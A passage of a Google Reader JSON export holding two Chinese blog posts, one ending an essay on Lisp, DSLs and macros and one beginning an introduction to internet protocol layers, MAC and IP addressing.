                 &lt;a/&gt;\n                    &lt;/gcd&gt;\n                &lt;/return&gt;\n            &lt;/else&gt;\n        &lt;/body&gt;\n    &lt;/func&gt;\n</pre>\n<p>其次，我们可以用它来定义类：</p>\n<pre>\n    &lt;class name=&quot;Computer&quot;&gt;\n        &lt;field access=&quot;private&quot; type=&quot;MainBoard&quot; name=&quot;main-board&quot; /&gt;\n        &lt;field access=&quot;private&quot; type=&quot;CPU&quot; name=&quot;cpu&quot; /&gt;\n        &lt;field access=&quot;private&quot; type=&quot;Memory&quot; name=&quot;memory&quot; /&gt;\n\n        &lt;method access=&quot;public&quot; return_type=&quot;boolean&quot; name=&quot;powerOn&quot; /&gt;\n            &lt;params&gt;...&lt;/params&gt;\n            &lt;body&gt;...&lt;/body&gt;\n        &lt;/method&gt;\n\n        &lt;method access=&quot;public&quot; return_type=&quot;boolean&quot; name=&quot;powerOff&quot; /&gt;\n            &lt;params&gt;...&lt;/params&gt;\n            &lt;body&gt;...&lt;/body&gt;\n        &lt;/method&gt;\n    &lt;/class&gt;\n</pre>\n<p>还可以轻易地用它来编写关系查询：</p>\n<pre>\n&lt;sql&gt;\n    &lt;select&gt;\n        &lt;column name=&quot;employees.id&quot; /&gt;\n        &lt;column name=&quot;bonus.amount&quot; /&gt;\n    &lt;/select&gt;\n    &lt;from&gt;\n        &lt;table name=&quot;employees&quot; /&gt;\n        &lt;table name=&quot;bonus&quot; /&gt;\n    &lt;/from&gt;\n    &lt;where&gt;\n        &lt;equals&gt;\n            &lt;column name=&quot;employees.id&quot; /&gt;\n            &lt;column name=&quot;bonus.employee_id&quot; /&gt;\n        &lt;/equals&gt;\n    &lt;/where&gt;\n&lt;/sql&gt;\n</pre>\n<p>还可以用它来实现类似make file的自动化构建(语法取自ant)：</p>\n<pre>\n    &lt;project name=&quot;MyProject&quot; default=&quot;dist&quot; basedir=&quot;.&quot;&gt;\n        &lt;property name=&quot;src&quot; location=&quot;src&quot;/&gt;\n        &lt;property name=&quot;build&quot; location=&quot;build&quot;/&gt;\n        &lt;property name=&quot;dist&quot;  location=&quot;dist&quot;/&gt;\n\n        &lt;target name=&quot;init&quot;&gt;\n            &lt;mkdir dir=&quot;${build}&quot;/&gt;\n        &lt;/target&gt;\n\n        &lt;target name=&quot;compile&quot; depends=&quot;init&quot; description=&quot;compile the source &quot; &gt;\n            &lt;javac srcdir=&quot;${src}&quot; destdir=&quot;${build}&quot;/&gt;\n        &lt;/target&gt;\n\n        &lt;target name=&quot;dist&quot; depends=&quot;compile&quot; description=&quot;generate the distribution&quot; &gt;\n            &lt;mkdir dir=&quot;${dist}/lib&quot;/&gt;\n            &lt;jar jarfile=&quot;${dist}/lib/MyProject-${DSTAMP}.jar&quot; basedir=&quot;${build}&quot;/&gt;\n        &lt;/target&gt;\n\n        &lt;target name=&quot;clean&quot; description=&quot;clean up&quot; &gt;\n            &lt;delete dir=&quot;${build}&quot;/&gt;\n            &lt;delete dir=&quot;${dist}&quot;/&gt;\n        &lt;/target&gt;\n    &lt;/project&gt;\n</pre>\n<p>一口气举了这么多个例子，目的在于用XML这种树形结构来说明Lisp的S表达式所能够描述的语义。不知道你是否发现了S表达式和XML这种树形语法在语义构造方面有着特别的“柔性”？我们可以轻易地用它构造出函数、变量、条件判断语义；类、属性、方法语义；可以轻易地构造出关系模型的select、where语义；可以轻易地构造出make的target、depends语义，等等数不清的语义。在普通语言里，你可以定义一个函数、一个类，但你无法为C语言增加匿名函数特性，也没法给Java语言加上RAII语义，甚至连自己创造一个foreach循环都不行，而自定义语义意味着在Lisp之上<strong>你创造了一门语言</strong>！不管是面向过程，面向对象，函数式，还是关系模型，在Lisp里统统都变成了一种DSL，而Lisp本身也就成了一种定义语言的语言，即元语言(Meta Language)。</p>\n<p>Lisp的柔性与S表达式有着密切的关系。Lisp并不限制你用S表达式来表达什么语义，同样的S表达式语法可以表达各种不同领域的语义，这就是<strong>语法和语义解耦</strong>。如果说普通语言的刚性源于“语法和语义紧耦合”，那么Lisp的柔性正是源于“语法和语义解耦”！“语法和语义解耦”使得Lisp可以随意地构造各种领域的DSL，而不强制用某一种范式或是领域视角去分析和解决问题。本质上，Lisp编程是一种超越了普通编程范式的范式，这就是<strong>Lisp之道：面向语言编程(LOP, Language Oriented Programming)</strong>。Wikipedia上是这样描述LOP的：</p>\n<blockquote><p>Language oriented programming (LOP) is a style of computer programming in which, rather than solving problems in general-purpose programming languages, the programmer creates one or more domain-specific languages for the problem first, and solves the problem in those languages … The concept of Language Oriented Programming takes the approach to capture requirements in the user’s terms, and then to try to create an implementation language as isomorphic as possible to the user’s descriptions, so that the mapping between requirements and implementation is as direct as possible.</p></blockquote>\n<p>LOP范式的基本思想是从问题出发，先创建一门描述领域模型的DSL，再用DSL去解决问题，它具有高度的声明性和抽象性。SQL、make file、CSS等DSL都可以被认为是LOP的具体实例，下面我们再通过两个常见的例子来理解LOP的优势。</p>\n<p>例1：在股票交易系统中，交易协议定义若干二进制的消息格式，交易所和客户端需要对消息进行编码和解码。</p>\n<p>消息格式是一种抽象的规范，本身不对语言做任何的限制，你可以用C，C++，Java，或者Python。普通的实现方式是按照消息格式规范，在相应的语言中定义消息结构，并编写相应的编解码函数。假设为一个消息定义结构和实现编解码函数的工作量为M，不同消息类型的数量为N，这种方式的工作量大致为M*N。也就是说每增加一种消息类型，就需要为该消息定义结构，实现编解码函数，引入bug的可能性当然也和M*N成正比。如果仔细观察不难发现，各个消息结构其实是高度类似的，编解码函数也大同小异，但是普通语言却找不到一种抽象机制能表达这种共性，比如，我们无法通过面向对象的方法定义一个基类把消息结构的共性抽象出来，然后让具体的消息去继承它，达到复用的目的。这正是由于普通语言的抽象维度限制所致，在普通语言中，你只能从函数、接口等维度对事物进行抽象，而恰好消息格式共性所在的维度与这些抽象维度并不匹配。</p>\n<p>其实，不同消息类型的<strong>共性在于它们都具有相同的领域语义</strong>，比如：“某字段内容是另一个字段内容的md5码”就是一种消息格式的领域语义，这种领域语义是OOP的抽象机制无法描述的。LOP的思路是先创建一门消息定义DSL，比如，类似Google的Protocol Buffer，Android的AIDL。然后，通过DSL编写消息定义文件，直接声明式地描述消息的结构特征，比如，我们可以声明式地描述“某字段内容是另一个字段内容的md5码”。我们还需要为DSL开发编译器用于生成C、Java等通用语言的消息定义和编解码函数。</p>\n<p>有了消息定义DSL和编译器之后，由于DSL编写消息定义是一种高度声明式的编程方法，每增加一种消息的只需要多编写一个消息定义文件而已，工作量几乎可以忽略不计。所有的工作量都集中在编译器的开发上，工作量是一个常数C，与消息的数量没有关系；质量保证方面也只需要关注编译器这一点，不会因为增加新的消息类型而引入bug。</p>\n<p>例2：在图书管理系统中，需要支持在管理界面上对书籍、学生、班级等各种实体进行管理操作。</p>\n<p>如果按传统的三层架构，一般需要在后端程序中为每一种实体定义一个类，并定义相应的方法实现CRUD操作，与之相应的，还需要在前端页面中为每一个实体编写相应的管理页面。这些实体类的CRUD操作都是大同小异的，但细节又各不相同，虽然我们很想复用某些共同的设计实现，但OOP所提供的封装、继承、多态等抽象机制不足以有效捕获实体之间的共性，大量的代码还是必须放在子类中来完成。比如，Student和Book实体类的实现非常相似，但是如果要通过OOP的方式去抽象它们的共性，得出的结果多半是Entity这样的大而空的基类，很难起到复用的效果。</p>\n<p>其实，不同实体之间的共性还是在于它们具有相同的领域语义，比如：实体具有属性，属性具有类型，属性具有取值范围，属性具有可读取、可编辑等访问属性，实体之间有关联关系等。LOP方法正是直接面向这种领域语义的。采用LOP方法，我们并不需要为每一个实体类单独编写CRUD方法，也不需要单独编写管理页面，只需要定义一种DSL并实现其编译器；然后，用DSL声明式地编写实体描述文件，去描述实体的属性列表，属性的类型、取值范围，属性所支持的操作，属性之间的关系和约束条件等；最后，通过这个实体描述文件自动生成后端的实体类和前端管理页面。采用LOP，不论前后端采用何种技术，Java也好，C#也好，JSP也好，ASP.NET也好，都可以自动生成它们的代码。采用LOP的工作量和质量都集中在DSL的设计和编译器的开发，与实体的数量无关，也就是说，越是庞大的系统，实体类越多越是能体现LOP的优势。</p>\n<p>通过上面两个小例子我们可以感受到，LOP是一种面向领域的，高度声明式的编程方式，它的抽象维度与领域模型的维度完全一致。LOP能让程序员从复杂的实现细节中解脱出来，把关注点集中在问题的本质上，从而提高编程的效率和质量。</p>\n<p>接下来的问题是如果需要为某领域设计DSL，我们是应该发明一门类似SQL这样的专用DSL呢，还是用XML或S表达式去定义DSL呢？它们各有何优缺点呢？</p>\n<p>我认为采用XML或S表达式定义DSL的优点主要有：1) SQL、make file、CSS等专用DSL都只能面向各自的领域，而一个实际的领域问题通常是跨越多个领域的，有时我们需要将不同领域融合在一起，但是由于普通语言的刚性，多语言融合通常会是一件非常困难的事情，而XML和S表达式语法结构的单一性和“代码及数据”的特点使得跨领域融合毫无障碍。2) 在为DSL开发编译器或解释器的方面，二者难度不同。对XML和S表达式定义的DSL进行语法分析非常简单，相比之下，对SQL这样的专用DSL进行语法分析，虽然可以借助Lex、Yacc、ANTLR等代码生成工具，但总的来讲复杂度还是要明显高一些。</p>\n<p>当然，XML和S表达式的优点也正好是其缺点，由于XML和S表达式的语法形式是固定的，不能像专用DSL那样自由地设计语法。所以，一般来讲专用DSL的语法显得更加简洁。换句话说，XML和Lisp其实是在语法和语义间做了一个交换，用语法的限制换来了语义的灵活。</p>\n<h4>Lisp之器</h4>\n<p>接下来我们继续探讨DSL的解释执行问题。DSL代码的解释执行一般分为3种典型的方式：1) 通过专门的解释器解释执行；2) 编译生成其他语言的代码，再通过其他语言的解释器解释执行(或编译运行)；3) 自解释。比如，第1类的代表是SQL，上一节举的两个例子都属于第2类，而第3类自解释正是Lisp的特色。</p>\n<p>为了理解自解释，我们可以先从内部DSL的解释执行说起。内部DSL是指嵌入在宿主语言中的DSL，比如，Google Test单元测试框架定义了一套基于流畅接口(Fluent Interface)的C++单元测试DSL。从语义构造的角度看，内部DSL直接借用宿主语言的语法定义了自己的领域语义，是一种语法和语义解耦；从解释执行的角度看，内部DSL是随宿主语言的解释器而自动解释的，不需要像外部DSL一样开发专门的解释器，因而实现的代价很低。当然，并不是说设计内部DSL不用关心任何的解释实现，实际上，还是需要熟悉宿主语言的特性，并利用该特性使得DSL能随着宿主语言的解释器得到解释执行。</p>\n<p>Lisp拥有强大的自解释特性，这得益于独一无二的<strong>Lisp之器：宏 (macro)</strong>。宏使得Lisp编写的DSL可以被Lisp解释器直接解释执行，这在原理上与内部DSL是相通的，只是内部DSL一般是利用宿主语言的链式调用等特性，通常形式简陋，功能有限，而Lisp的宏则要强大和灵活得多。</p>\n<p>C语言中也有宏的概念，不过Lisp的宏与C语言的宏完全不同，C语言的宏是简单的字符串替换。比如，下面的宏定义：</p>\n<pre>\n#define square(x) (x*x)\n</pre>\n<p>square(1+1)的期望结果是4，而实际上它会被替换成(1+1*1+1)，结果是3。这个例子说明，C语言的宏只在预编译阶段进行简单的字符串替换，对程序语法结构缺乏理解，非常脆弱。Lisp的宏不是简单的字符串替换，而是一套完整的代码生成系统，它是在语法解析的基础上把Lisp代码从一种形式转换为另一种形式，本质上起到了普通语言编译器的作用。不同的是，普通编译器是把一种语言的代码转换为另一种语言的代码，比如，Java编译器把Java代码转换成Java字节码；而Lisp宏的输入和输出都是S表达式，它本质上是把一种DSL转换为另一种DSL。下面的例子是宏的一个典型用法。</p>\n<p>例3：假设Lisp解释器已经具备解释执行面向过程DSL的能力，需要实现类似ant的自动化构建工具。</p>\n<p>我们可以基于宏构建一门类ant的DSL，宏的作用是把类ant DSL通过宏展开变成面向过程的DSL，最后被Lisp解释器所解释执行。这样用Lisp编写的ant DSL就不需要被编译为其他语言，也不需要像XML的ant一样依赖于专门的解释器了。</p>\n<p>当然，和开发专门的解释器/编译器相比，Lisp的宏也并非没有缺点，宏难以理解，开发和调试更加困难。到底是开发专门的解释器/编译器还是直接采用宏应该视具体情况而定。</p>\n<h4>总结</h4>\n<p>Lisp采用单一的S表达式语法表达不同的语义，实现了语法和语义解耦。这使得Lisp具有强大的语义构造能力，擅长于构造DSL实现面向语言编程，而宏使得Lisp具有自解释能力，让不同DSL之间的转换游刃有余。进入Lisp的世界应当从理解面向语言编程入门，这是Lisp之道，而函数式编程和宏皆为Lisp之器，以道驭器方为正途。</p>\n<h4>后记</h4>\n<p>本文是我学习Lisp的一个总结，也是写给有兴趣学习Lisp的程序员的入门资料。必须说明，我还是一个标准的Lisp初学者，几乎没有写过像样的Lisp程序，文中的错误和不足在所难免，希望读者批评指正，感谢！</p>\n<h4>参考</h4>\n<p><a href=\"http://www.paulgraham.com/rootsoflisp.html\">The Roots of Lisp</a></p>\n<p><a href=\"http://www.defmacro.org/ramblings/lisp.html\">The Nature of Lisp</a></p>\n<p><a href=\"http://lists.warhead.org.uk/pipermail/iwe/2005-July/000130.html\">Why Lisp macros are cool, a Perl perspective</a></p>\n<p><a href=\"http://en.wikipedia.org/wiki/Language-oriented_programming\">Wikipedia: Language-oriented programming</a></p>\n<p><a href=\"http://book.douban.com/subject/6859720/\">《实用Common Lisp编程》</a></p>\n<p><a href=\"http://book.douban.com/subject/4031906/\">《冒号课堂 – 编程范式与OOP思想》</a><br>\n<hr height=\"1\" width=\"100%\">\n<div style=\"margin-top:15px;font-size:11px;color:#cc0000\">\n<p align=\"center\"><strong>（转载本站文章请注明作者和出处 <a href=\"http://coolshell.cn/\">酷壳 – CoolShell.cn</a> ，请勿用于任何商业用途）</strong></p></div>\n<div style=\"text-align:center;padding:0px;font-size:11px;margin-bottom:50px\">————————============ <b>感谢 <a href=\"http://42qu.com/\">42qu.com</a> 为本站提供 <a href=\"http://vps.42qu.com/\"> VPS</a></b> ============————————</div>\n<table cellspacing=\"0\" cellpadding=\"3\" border=\"0\" style=\"clear:both\">\n    \n    <tr>\n        <td colspan=\"5\"><b><font size=\"-1\" style=\"display:block!important;padding:20px 0 5px!important\">您可能也喜欢：</font></b></td>\n    </tr>\n    \n        <tr>\n                <td width=\"102\" valign=\"top\" style=\"padding:5px!important;margin:0!important\">\n                    <a title=\"编程语言汽车\" style=\"text-decoration:none!important\" href=\"http://app.wumii.com/ext/redirect?url=http%3A%2F%2Fcoolshell.cn%2Farticles%2F1839.html&amp;from=http%3A%2F%2Fcoolshell.cn%2Farticles%2F7526.html\">\n                        <img style=\"margin:0!important;padding:2px!important;border:1px solid #dddddd!important;width:96px!important;height:96px!important\" src=\"http://static.wumii.com/site_images/2011/11/08/10434968.jpg\" width=\"96px\" height=\"96px\"><br>\n                        <font size=\"-1\" color=\"#333333\" style=\"display:block!important;line-height:15px!important;width:102px!important;font:12px/15px arial!important;height:60px!important;margin:3px 0 0 0!important;padding:0!important;overflow:hidden!important\">编程语言汽车</font>\n                    </a>\n                </td>\n                <td width=\"102\" valign=\"top\" style=\"padding:5px!important;margin:0!important;border-left:1px solid #dddddd!important\">\n                    <a title=\"编程语言进化\" style=\"text-decoration:none!important\" href=\"http://app.wumii.com/ext/redirect?url=http%3A%2F%2Fcoolshell.cn%2Farticles%2F3100.html&amp;from=http%3A%2F%2Fcoolshell.cn%2Farticles%2F7526.html\">\n                        <img style=\"margin:0!important;padding:2px!important;border:1px solid #dddddd!important;width:96px!important;height:96px!important\" src=\"http://static.wumii.com/site_images/2011/06/21/13666551.jpg\" width=\"96px\" height=\"96px\"><br>\n                        <font size=\"-1\" color=\"#333333\" style=\"display:block!important;line-height:15px!important;width:102px!important;font:12px/15px arial!important;height:60px!important;margin:3px 0 0 0!important;padding:0!important;overflow:hidden!important\">编程语言进化</font>\n                    </a>\n                </td>\n                <td width=\"102\" valign=\"top\" style=\"padding:5px!important;margin:0!important;border-left:1px solid #dddddd!important\">\n                    <a title=\"基于JVM的语言正在开始流行\" style=\"text-decoration:none!important\" href=\"http://app.wumii.com/ext/redirect?url=http%3A%2F%2Fcoolshell.cn%2Farticles%2F247.html&amp;from=http%3A%2F%2Fcoolshell.cn%2Farticles%2F7526.html\">\n                        <img style=\"margin:0!important;padding:2px!important;border:1px solid #dddddd!important;width:96px!important;height:96px!important\" src=\"http://static.wumii.com/site_images/2011/11/08/10437612.png\" width=\"96px\" height=\"96px\"><br>\n                        <font size=\"-1\" color=\"#333333\" style=\"display:block!important;line-height:15px!important;width:102px!important;font:12px/15px arial!important;height:60px!important;margin:3px 0 0 0!important;padding:0!important;overflow:hidden!important\">基于JVM的语言正在开始流行</font>\n                    </a>\n                </td>\n                <td width=\"102\" valign=\"top\" style=\"padding:5px!important;margin:0!important;border-left:1px solid #dddddd!important\">\n                    <a title=\"Go 语言：Google 的新编程语言\" style=\"text-decoration:none!important\" href=\"http://app.wumii.com/ext/redirect?url=http%3A%2F%2Fcoolshell.cn%2Farticles%2F1751.html&amp;from=http%3A%2F%2Fcoolshell.cn%2Farticles%2F7526.html\">\n                        <img style=\"margin:0!important;padding:2px!important;border:1px solid #dddddd!important;width:96px!important;height:96px!important\" src=\"http://static.wumii.com/site_images/2011/05/13/8581040.png\" width=\"96px\" height=\"96px\"><br>\n                        <font size=\"-1\" color=\"#333333\" style=\"display:block!important;line-height:15px!important;width:102px!important;font:12px/15px arial!important;height:60px!important;margin:3px 0 0 0!important;padding:0!important;overflow:hidden!important\">Go 语言：Google 的新编程语言</font>\n                    </a>\n                </td>\n                <td width=\"102\" valign=\"top\" style=\"padding:5px!important;margin:0!important;border-left:1px solid #dddddd!important\">\n                    <a title=\"编程语言时间地理图\" style=\"text-decoration:none!important\" href=\"http://app.wumii.com/ext/redirect?url=http%3A%2F%2Fcoolshell.cn%2Farticles%2F1863.html&amp;from=http%3A%2F%2Fcoolshell.cn%2Farticles%2F7526.html\">\n                        <img style=\"margin:0!important;padding:2px!important;border:1px solid #dddddd!important;width:96px!important;height:96px!important\" src=\"http://static.wumii.com/site_images/2011/11/08/10438028.jpg\" width=\"96px\" height=\"96px\"><br>\n                        <font size=\"-1\" color=\"#333333\" style=\"display:block!important;line-height:15px!important;width:102px!important;font:12px/15px arial!important;height:60px!important;margin:3px 0 0 0!important;padding:0!important;overflow:hidden!important\">编程语言时间地理图</font>\n                    </a>\n                </td>\n        </tr>\n    \n    <tr>\n        <td colspan=\"5\" align=\"right\">\n            <a style=\"text-decoration:none!important\" href=\"http://www.wumii.com/widget/relatedItems\" title=\"无觅相关文章插件\">\n                <font size=\"-1\" color=\"#bbbbbb\" style=\"display:block!important;font-family:arial!important;padding:5px 0!important;font-size:12px!important;color:#bbb!important\">无觅</font>\n            </a>\n        </td>\n    </tr>\n</table><h3>相关文章</h3><ul><li>2009年11月24日 -- <a href=\"http://coolshell.cn/articles/1839.html\" title=\"编程语言汽车\">编程语言汽车</a></li></ul></p>"
    },
    "author" : "Todd",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://coolshell.cn/feed",
      "title" : "酷壳 - CoolShell.cn",
      "htmlUrl" : "http://coolshell.cn"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1338488498620",
    "timestampUsec" : "1338488498620191",
    "id" : "tag:google.com,2005:reader/item/3743d8866c25f4ad",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "IT" ],
    "title" : "互联网协议入门（一）",
    "published" : 1338439443,
    "updated" : 1338439443,
    "alternate" : [ {
      "href" : "http://www.ruanyifeng.com/blog/2012/05/internet_protocol_suite_part_i.html",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "<p>我们每天使用互联网，你是否想过，它是如何实现的？</p><p>全世界几十亿台电脑，连接在一起，两两通信。上海的某一块网卡送出信号，洛杉矶的另一块网卡居然就收到了，两者实际上根本不知道对方的物理位置，你不觉得这是很神奇的事情吗？</p>\n\n<p>互联网的核心是一系列协议，总称为\"互联网协议\"（Internet Protocol Suite）。它们对电脑如何连接和组网，做出了详尽的规定。理解了这些协议，就理解了互联网的原理。</p>\n\n<p>下面就是我的学习笔记。因为这些协议实在太复杂、太庞大，我想整理一个简洁的框架，帮助自己从总体上把握它们。为了保证简单易懂，我做了大量的简化，有些地方并不全面和精确，但是应该能够说清楚互联网的原理。</p>\n\n<p>=================================================</p>\n\n<p><strong>互联网协议入门</strong></p>\n\n<p>作者：阮一峰</p>\n\n<p><img src=\"http://image.beekka.com/blog/201205/bg2012052901.jpg\"></p>\n\n<p><strong>一、概述</strong></p>\n\n<p><strong>1.1 五层模型</strong></p>\n\n<p>互联网的实现，分成好几层。每一层都有自己的功能，就像建筑物一样，每一层都靠下一层支持。</p>\n\n<p>用户接触到的，只是最上面的一层，根本没有感觉到下面的层。要理解互联网，必须从最下层开始，自下而上理解每一层的功能。</p>\n\n<p>如何分层有不同的模型，有的模型分七层，有的分四层。我觉得，把互联网分成五层，比较容易解释。</p>\n\n<p><img src=\"http://image.beekka.com/blog/201205/bg2012052902.png\"></p>\n\n<p>如上图所示，最底下的一层叫做\"实体层\"（Physical Layer），最上面的一层叫做\"应用层\"（Application Layer），中间的三层（自下而上）分别是\"链接层\"（Link Layer）、\"网络层\"（Network Layer）和\"传输层\"（Transport Layer）。越下面的层，越靠近硬件；越上面的层，越靠近用户。</p>\n\n<p>它们叫什么名字，其实并不重要。只需要知道，互联网分成若干层就可以了。</p>\n\n<p><strong>1.2 层与协议</strong></p>\n\n<p>每一层都是为了完成一种功能。为了实现这些功能，就需要大家都遵守共同的规则。</p>\n\n<p>大家都遵守的规则，就叫做\"协议\"（protocol）。</p>\n\n<p>互联网的每一层，都定义了很多协议。这些协议的总称，就叫做\"互联网协议\"（Internet Protocol Suite）。它们是互联网的核心，下面介绍每一层的功能，主要就是介绍每一层的主要协议。</p>\n\n<p><strong>二、实体层</strong></p>\n\n<p>我们从最底下的一层开始。</p>\n\n<p>电脑要组网，第一件事要干什么？当然是先把电脑连起来，可以用光缆、电缆、双绞线、无线电波等方式。</p>\n\n<p><img src=\"http://image.beekka.com/blog/201205/bg2012052903.png\"></p>\n\n<p><strong>这就叫做\"实体层\"，它就是把电脑连接起来的物理手段。它主要规定了网络的一些电气特性，作用是负责传送0和1的电信号。</strong></p>\n\n<p><strong>三、链接层</strong></p>\n\n<p><strong>3.1 定义</strong></p>\n\n<p>单纯的0和1没有任何意义，必须规定解读方式：多少个电信号算一组？每个信号位有何意义？</p>\n\n<p><strong>这就是\"链接层\"的功能，它在\"实体层\"的上方，确定了0和1的分组方式。</strong></p>\n\n<p><strong>3.2 以太网协议</strong></p>\n\n<p>早期的时候，每家公司都有自己的电信号分组方式。逐渐地，一种叫做<a href=\"http://zh.wikipedia.org/wiki/%E4%BB%A5%E5%A4%AA%E7%BD%91\">\"以太网\"</a>（Ethernet）的协议，占据了主导地位。</p>\n\n<p>以太网规定，一组电信号构成一个数据包，叫做\"帧\"（Frame）。每一帧分成两个部分：标头（Head）和数据（Data）。</p>\n\n<p><img src=\"http://image.beekka.com/blog/201205/bg2012052904.png\"></p>\n\n<p>\"标头\"包含数据包的一些说明项，比如发送者、接受者、数据类型等等；\"数据\"则是数据包的具体内容。</p>\n\n<p>\"标头\"的长度，固定为18字节。\"数据\"的长度，最短为46字节，最长为1500字节。因此，整个\"帧\"最短为64字节，最长为1518字节。如果数据很长，就必须分割成多个帧进行发送。</p>\n\n<p><strong>3.3 MAC地址</strong></p>\n\n<p>上面提到，以太网数据包的\"标头\"，包含了发送者和接受者的信息。那么，发送者和接受者是如何标识呢？</p>\n\n<p>以太网规定，连入网络的所有设备，都必须具有\"网卡\"接口。数据包必须是从一块网卡，传送到另一块网卡。网卡的地址，就是数据包的发送地址和接收地址，这叫做MAC地址。</p>\n\n<p><img src=\"http://image.beekka.com/blog/201205/bg2012052905.jpg\"></p>\n\n<p>每块网卡出厂的时候，都有一个全世界独一无二的MAC地址，长度是48个二进制位，通常用12个十六进制数表示。</p>\n\n<p><img src=\"http://image.beekka.com/blog/201205/bg2012052906.png\"></p>\n\n<p>前6个十六进制数是厂商编号，后6个是该厂商的网卡流水号。有了MAC地址，就可以定位网卡和数据包的路径了。</p>\n\n<p><strong>3.4 广播</strong></p>\n\n<p>定义地址只是第一步，后面还有更多的步骤。</p>\n\n<p>首先，一块网卡怎么会知道另一块网卡的MAC地址？</p>\n\n<p>回答是有一种ARP协议，可以解决这个问题。这个留到后面介绍，这里只需要知道，以太网数据包必须知道接收方的MAC地址，然后才能发送。</p>\n\n<p>其次，就算有了MAC地址，系统怎样才能把数据包准确送到接收方？</p>\n\n<p>回答是以太网采用了一种很\"原始\"的方式，它不是把数据包准确送到接收方，而是向本网络内所有计算机发送，让每台计算机自己判断，是否为接收方。</p>\n\n<p><img src=\"http://image.beekka.com/blog/201205/bg2012052907.png\"></p>\n\n<p>上图中，1号计算机向2号计算机发送一个数据包，同一个子网络的3号、4号、5号计算机都会收到这个包。它们读取这个包的\"标头\"，找到接收方的MAC地址，然后与自身的MAC地址相比较，如果两者相同，就接受这个包，做进一步处理，否则就丢弃这个包。这种发送方式就叫做\"广播\"（broadcasting）。</p>\n\n<p>有了数据包的定义、网卡的MAC地址、广播的发送方式，\"链接层\"就可以在多台计算机之间传送数据了。</p>\n\n<p><strong>四、网络层</strong></p>\n\n<p><strong>4.1 网络层的由来</strong></p>\n\n<p>以太网协议，依靠MAC地址发送数据。理论上，单单依靠MAC地址，上海的网卡就可以找到洛杉矶的网卡了，技术上是可以实现的。</p>\n\n<p>但是，这样做有一个重大的缺点。以太网采用广播方式发送数据包，所有成员人手一\"包\"，不仅效率低，而且局限在发送者所在的子网络。也就是说，如果两台计算机不在同一个子网络，广播是传不过去的。这种设计是合理的，否则互联网上每一台计算机都会收到所有包，那会引起灾难。</p>\n\n<p>互联网是无数子网络共同组成的一个巨型网络，很像想象上海和洛杉矶的电脑会在同一个子网络，这几乎是不可能的。</p>\n\n<p><img src=\"http://image.beekka.com/blog/201205/bg2012052914.png\"></p>\n\n<p>因此，必须找到一种方法，能够区分哪些MAC地址属于同一个子网络，哪些不是。如果是同一个子网络，就采用广播方式发送，否则就采用\"路由\"方式发送。（\"路由\"的意思，就是指如何向不同的子网络分发数据包，这是一个很大的主题，本文不涉及。）遗憾的是，MAC地址本身无法做到这一点。它只与厂商有关，与所处网络无关。</p>\n\n<p><strong>这就导致了\"网络层\"的诞生。它的作用是引进一套新的地址，使得我们能够区分不同的计算机是否属于同一个子网络。这套地址就叫做\"网络地址\"，简称\"网址\"。</strong></p>\n\n<p>于是，\"网络层\"出现以后，每台计算机有了两种地址，一种是MAC地址，另一种是网络地址。两种地址之间没有任何联系，MAC地址是绑定在网卡上的，网络地址则是管理员分配的，它们只是随机组合在一起。</p>\n\n<p>网络地址帮助我们确定计算机所在的子网络，MAC地址则将数据包送到该子网络中的目标网卡。因此，从逻辑上可以推断，必定是先处理网络地址，然后再处理MAC地址。</p>\n\n<p><strong>4.2 IP协议</strong></p>\n\n<p>规定网络地址的协议，叫做IP协议。它所定义的地址，就被称为IP地址。</p>\n\n<p>目前，广泛采用的是IP协议第四版，简称IPv4。这个版本规定，网络地址由32个二进制位组成。</p>\n\n<p><img src=\"http://image.beekka.com/blog/201205/bg2012052908.png\"></p>\n\n<p>习惯上，我们用分成四段的十进制数表示IP地址，从0.0.0.0一直到255.255.255.255。</p>\n\n<p>互联网上的每一台计算机，都会分配到一个IP地址。这个地址分成两个部分，前一部分代表网络，后一部分代表主机。比如，IP地址172.16.254.1，这是一个32位的地址，假定它的网络部分是前24位（172.16.254），那么主机部分就是后8位（最后的那个1）。处于同一个子网络的电脑，它们IP地址的网络部分必定是相同的，也就是说172.16.254.2应该与172.16.254.1处在同一个子网络。</p>\n\n<p>但是，问题在于单单从IP地址，我们无法判断网络部分。还是以172.16.254.1为例，它的网络部分，到底是前24位，还是前16位，甚至前28位，从IP地址上是看不出来的。</p>\n\n<p>那么，怎样才能从IP地址，判断两台计算机是否属于同一个子网络呢？这就要用到另一个参数\"子网掩码\"（subnet mask）。</p>\n\n<p>所谓\"子网掩码\"，就是表示子网络特征的一个参数。它在形式上等同于IP地址，也是一个32位二进制数字，它的网络部分全部为1，主机部分全部为0。比如，IP地址172.16.254.1，如果已知网络部分是前24位，主机部分是后8位，那么子网络掩码就是11111111.11111111.11111111.00000000，写成十进制就是255.255.255.0。</p>\n\n<p>知道\"子网掩码\"，我们就能判断，任意两个IP地址是否处在同一个子网络。方法是将两个IP地址与子网掩码分别进行AND运算（两个数位都为1，运算结果为1，否则为0），然后比较结果是否相同，如果是的话，就表明它们在同一个子网络中，否则就不是。</p>\n\n<p>比如，已知IP地址172.16.254.1和172.16.254.233的子网掩码都是255.255.255.0，请问它们是否在同一个子网络？两者与子网掩码分别进行AND运算，结果都是172.16.254.0，因此它们在同一个子网络。</p>\n\n<p>总结一下，IP协议的作用主要有两个，一个是为每一台计算机分配IP地址，另一个是确定哪些地址在同一个子网络。</p>\n\n<p><strong>4.3 IP数据包</strong></p>\n\n<p>根据IP协议发送的数据，就叫做IP数据包。不难想象，其中必定包括IP地址信息。</p>\n\n<p>但是前面说过，以太网数据包只包含MAC地址，并没有IP地址的栏位。那么是否需要修改数据定义，再添加一个栏位呢？</p>\n\n<p>回答是不需要，我们可以把IP数据包直接放进以太网数据包的\"数据\"部分，因此完全不用修改以太网的规格。这就是互联网分层结构的好处：上层的变动完全不涉及下层的结构。</p>\n\n<p>具体来说，IP数据包也分为\"标头\"和\"数据\"两个部分。</p>\n\n<p><img src=\"http://image.beekka.com/blog/201205/bg2012052909.png\"></p>\n\n<p>\"标头\"部分主要包括版本、长度、IP地址等信息，\"数据\"部分则是IP数据包的具体内容。它放进以太网数据包后，以太网数据包就变成了下面这样。</p>\n\n<p><img 